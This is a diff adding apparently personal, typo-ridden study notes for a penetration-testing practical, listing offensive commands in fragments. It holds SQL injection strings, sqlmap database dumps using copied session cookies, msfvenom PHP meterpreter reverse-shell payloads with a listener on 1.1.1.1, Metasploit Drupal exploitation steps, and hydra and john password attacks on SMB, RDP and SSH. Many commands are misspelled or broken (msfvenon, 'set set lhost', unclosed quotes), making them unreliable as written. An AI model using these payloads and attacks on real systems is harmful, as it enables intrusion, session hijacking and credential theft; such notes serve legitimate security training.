@@ -1,0 +1,152 @@
+youtube
+nmap 88 , 389 dns ldap kerberos 
+nmap -p 88.389 1.1.1.1/24 --open 
+-A dns 
+
+if notfound check for other subnet 
+
+' or 1=1#
+' or 1=1--
+copy the url and inspect document.cookies 
+sqlmap -u urlcopy --cookie "" -D movie --dump
+
+sqmap -r sql.txt --dbs --batch 
+
+upload 
+
+
+
+
+
+
+document.cookie
+
+sqlmap - u htt:// copyurl --cookie "value" -D movie --dump
+copy url 
+sqlmap -r sql.txt --dbs --batch
+
+
+msfvenon -p php/meterpreter/reverse_tcp lhost=1.1.1.1 lport 444 -o shell.php
+
+msfconsole -x " use exploit /multi/handl/; set lhost 1.1.1.1 lport 4444 ; run"
+
+msfconsole -x " use exploit/multi/handler; set set lhost 1.1.1.1 lport 4444 ; run
+
+set payload first 
+
+
+msfvenon -p php/meterpreter/reverse_tcp
+msfconsole -x " use exploit/multi/handler; set set lhost 1.1.1.1 lport 4444 ; run
+
+options 
+run 
+
+wireshark http.pcap
+mqttt 
+ip.src==1.1.1
+ip.dst==1.1.1
+http 
+pwd 
+
+pop port number 110 mercury  version of 
+nmap -p 110 --open 1.1.1.1 -sV
+
+sudo arp 
+
+nmap --script vuln 192.168.162.134
+
+open stego  - decryp image bnb extension 
+
+
+steghide extract -sf gum.jpg 
+
+
+phonesploit tools 
+
+
+
+nmap -5555 
+
+
+hashes.com or crackstation
+
+hash provided 
+
+
+john --wordlist=/usr/shar/rockyou.txt hash.txt
+
+nmap -p 139,445 1.1.1.1.
+hydra -L user.txt -P pass.txt ip smb   
+hydra -l -p   smb://  rdp:// ssh://
+
+
+pexels - image version 
+
+
+exiftool fddd.jpg 
+
+aircrag-ng http.cap -w /home/atac/desp/userlist.txt 
+
+
+vertacrypt 
+
+cry[toforge  - 
+
+md5sum http.cap 
+
+sha256sum 
+
+sha284sum 
+
+
+user powershell to find file shahs
+ls
+get-filehash -Algortham sha256 test.txt 
+
+
+pyhton3 -m http.server 
+parroip:8000 browser to transfer file 
+
+mkdir /var/www/html/share
+cp sql.txt /var/www/html/share
+service apache2 start 
+parroip/share via browser 
+
+
+filtransfer.io txt
+
+
+mkdri
+
+ip/share
+
+vulnerability related to drupal 
+
+mfsconsole
+search drupal
+ 
+will show target 
+use /explot/  - ---- 
+options 
+show targets
+set target 1 
+run
+
+IDOR vulnerability   website 
+
+
+remina 
+type ip access rdp 
+yes
+username and password 
+
+
+sqli cheet shett github
+die - 
+mxtool site to check nlookup
+
+crc32 sql.txt 
+sha384sum 
+
+
+
